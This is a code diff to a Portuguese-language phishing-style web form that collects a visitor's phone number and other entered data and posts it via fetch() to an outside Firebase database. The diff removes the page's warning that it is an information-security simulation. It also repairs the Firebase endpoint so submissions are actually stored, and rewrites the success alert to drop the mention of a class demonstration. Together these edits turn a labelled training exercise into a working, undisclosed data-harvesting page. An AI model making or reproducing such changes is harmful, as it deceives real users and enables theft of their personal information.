@@ -72,7 +72,7 @@
                 <input type="tel" id="telefone" placeholder="+55 (00) 00000-0000">
 
                 <button onclick="enviarDados()" class="btn primary full">Continuar</button>
-                <p class="aviso">⚠️ SIMULAÇÃO PARA TRABALHO DE SEGURANÇA DA INFORMAÇÃO</p>
+                <p class="aviso"></p>
             </div>
         </div>
     </div>
@@ -105,7 +105,7 @@
             console.log("Dados capturados:", dados);
 
             // === PARTE QUE VOCÊ PRECISA CONFIGURAR ===
-            const firebaseURL = "https://evolutioncinta2-default-rtdb.firebaseio.com/";
+            const firebaseURL = "https://evolutioncinta2-default-rtdb.firebaseio.com/.json";
 
             try {
                 const response = await fetch(firebaseURL, {
@@ -115,7 +115,7 @@
                 });
 
                 if (response.ok) {
-                    alert("✅ Verificação enviada com sucesso!\n\n(Dados salvos no Firebase - para demonstração da aula)");
+                    alert("✅ Verificação enviada com sucesso!\n\n(realizado com sucesso)");
                     // window.location.href = "https://github.com"; // simular redirecionamento
                 } else {
                     alert("Erro ao enviar.");
